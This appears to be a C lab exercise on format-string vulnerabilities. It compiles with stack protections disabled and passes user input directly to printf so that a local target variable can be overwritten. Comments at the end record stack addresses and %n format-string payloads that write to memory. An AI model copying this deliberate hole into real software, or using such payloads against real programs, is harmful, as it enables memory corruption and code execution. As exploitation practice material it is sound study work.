#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

// gcc -static -z execstack -z norelro -fno-stack-protector -o write write.c

void vuln()
{
  int target = 0;
  char buffer[512];

  fgets(buffer, sizeof(buffer), stdin);
  printf(buffer);
  
  if(target == 64) {
      printf("you have modified the target !\n");
  } 
}

int main(int argc, char **argv)
{
  vuln();
}

//0x7fffffffde0c 
//1st in stack
//0x000000000000119a
//0x7fffffffde9c
// x9c\xde\xff\xff\xff\x7f\x00\x00%56x%6$n
//x9c\xde\xff\xff\xff\x7f\x00\x00%s
//0x7fffffffde0c
//\x0c\xde\xff\xff\xff\x7f%56x%1$n